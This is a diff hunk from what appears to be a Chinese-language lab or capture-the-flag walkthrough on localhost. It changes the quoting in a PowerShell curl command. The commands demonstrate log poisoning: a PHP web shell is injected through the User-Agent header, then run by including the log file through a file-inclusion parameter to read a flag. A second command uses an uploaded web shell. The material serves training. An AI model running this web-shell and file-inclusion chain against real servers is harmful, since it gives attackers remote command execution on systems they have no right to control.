@@ -25,7 +25,7 @@ curl.exe "http://localhost:8086/up6/uploads/d.php?1=cat%20/flag_up6.txt"
 
 ```powershell
 # ① 投毒:UA 是谁发的?你。日志记什么?你的 UA
-curl.exe -A '<?php system($_GET[1]); ?>' "http://localhost:8086/fi5/?page=inc/home.php"
+curl.exe -A "<?php system($_GET[1]); ?>" "http://localhost:8086/fi5/?page=inc/home.php"
 # ② 包含日志 → 日志里的代码行被执行
 curl.exe "http://localhost:8086/fi5/?page=/var/log/visit.log&1=cat%20/flag_fi5.txt"
 ```
